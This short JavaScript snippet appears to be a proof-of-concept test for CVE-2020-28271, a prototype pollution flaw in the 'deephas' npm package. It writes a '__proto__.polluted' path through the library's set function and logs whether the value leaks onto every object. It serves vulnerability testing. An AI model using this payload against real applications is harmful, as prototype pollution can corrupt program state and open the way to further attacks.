// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28271
// test("prototype pollution in deephas ", () => {
console.log({}.polluted);

  const dh = require("deephas");
  let obj = {};
  dh.set(obj, "__proto__.polluted", "yes");

console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
